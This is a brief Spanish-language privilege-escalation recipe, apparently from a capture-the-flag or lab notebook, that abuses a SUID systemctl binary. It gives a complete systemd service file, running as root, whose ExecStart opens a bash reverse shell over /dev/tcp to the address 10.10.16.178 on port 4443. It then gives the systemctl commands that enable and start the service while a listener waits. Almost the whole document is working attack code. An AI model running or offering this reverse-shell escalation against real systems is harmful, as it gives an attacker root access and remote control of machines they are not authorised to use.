Escalada de Privilegios: SUID systemctl

Crear fichero root.service en /home/pepper

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.178/4443 0>&1'

[Install]
WantedBy=multi-user.target

Ejecutar binario

# Listener 4443
/bin/systemctl enable /home/pepper/root.service
/bin/systemctl start root
